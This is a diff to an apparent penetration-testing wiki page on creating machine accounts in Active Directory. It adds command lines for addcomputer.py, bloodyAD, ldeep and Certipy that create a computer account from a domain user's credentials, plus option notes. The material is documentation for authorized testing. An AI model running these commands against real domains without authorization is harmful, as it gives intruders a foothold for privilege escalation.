@@ -70,7 +70,9 @@ The [Impacket](https://github.com/SecureAuthCorp/impacket) script [addcomputer](
 addcomputer.py -computer-name 'SomeName$' -computer-pass 'SomePassword' -dc-host "$DC_HOST" -domain-netbios "$DOMAIN" "$DOMAIN"/"$USER":"$PASSWORD"
 ```
 
-Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) instead with the `--add-computer` option, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96)
+`addcomputer.py` also has an option `-computer-group` for adding a group to which the account will be added. Because if omitted, the group `CN=Computers` will be used by default.
+
+Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) (Python) instead with the `--add-computer` option, like [this](https://arkanoidctf.medium.com/hackthebox-writeup-forest-4db0de793f96)
 
 {% hint style="info" %}
 When using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer script for the creation of a computer account, the "SAMR" method is used by default (instead of the LDAPS one). At the time of writing (10th of December, 2021), the SAMR method creates the account without SPNs. In this case, they could be added later on with [addspn.py](https://github.com/dirkjanm/krbrelayx) (Python). By default, computer accounts have the following SPNs set:
@@ -82,6 +84,26 @@ Host/hostname
 Host/hostname.domain_fqdn
 ```
 {% endhint %}
+
+With [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python):
+
+```bash
+bloodyad -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --host "$DC_HOST" add computer 'SomeName$' 'SomePassword'
+```
+
+With [ldeep](https://github.com/franc-pentest/ldeep) (Python):
+
+```bash
+ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_HOST" create_computer 'SomeName$' 'SomePassword'
+```
+
+With [Certipy](https://github.com/ly4k/Certipy) (Python):
+
+```bash
+certipy account create -username "$USER"@"$DOMAIN" -password "$PASSWORD" -dc-ip "$DC_HOST" -user 'SomeName$' -pass 'SomePassword' -dns 'SomeDNS'
+```
+
+Certipy also offers option to set the UPN (`-upn`), SAM account name (`-sam`), SPNS (`-spns`) while creating the computer.
 {% endtab %}
 
 {% tab title="Windows" %}
